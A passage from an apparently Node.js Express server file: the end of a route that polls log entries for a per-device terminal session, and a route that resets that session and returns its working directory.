        let log = clientData.get(logKey).value() || [];
        entries = log.filter(e => e.time && new Date(e.time).getTime() > sess.lastPoll);
        if (entries.length > 0) sess.lastPoll = Date.now();
    }
    res.json({ entries, cwd: sess.cwd });
});

// Reset session
routes.post('/term/:deviceID/:type/reset', isAllowed, (req, res) => {
    let key = req.params.deviceID + '_' + req.params.type;
    delete termSessions[key];
    let sess = getTermSession(req.params.deviceID, req.params.type);
    res.json({ error: false, cwd: sess.cwd });
});